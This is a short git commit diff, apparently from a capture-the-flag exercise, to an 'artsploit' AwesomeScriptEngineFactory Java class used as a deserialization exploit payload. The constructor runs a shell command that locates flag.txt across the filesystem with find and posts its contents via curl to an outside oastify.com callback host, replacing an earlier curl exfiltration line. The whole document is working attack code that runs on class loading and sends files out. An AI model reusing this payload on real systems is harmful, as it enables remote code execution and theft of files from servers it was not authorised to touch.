d15b3312418b408e2dc4ac427e364660d3bec025
Your Name <you@example.com>
2023-07-15 14:36:16 +0300

    3 commit

--- artsploit/AwesomeScriptEngineFactory.java
+++ artsploit/AwesomeScriptEngineFactory.java
@@ -9,7 +9,7 @@ public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
 
     public AwesomeScriptEngineFactory() {
         try {
-		Runtime.getRuntime().exec("curl -X POST -d @flag.txt http://6268nnj4uyhqkh1i886f6dxxcoil6du2.oastify.com");
+		Runtime.getRuntime().exec("find / -name flag.txt -exec curl -X POST -d @{} http://6268nnj4uyhqkh1i886f6dxxcoil6du2.oastify.com \\;");
         } catch (IOException e) {
             e.printStackTrace();
         }
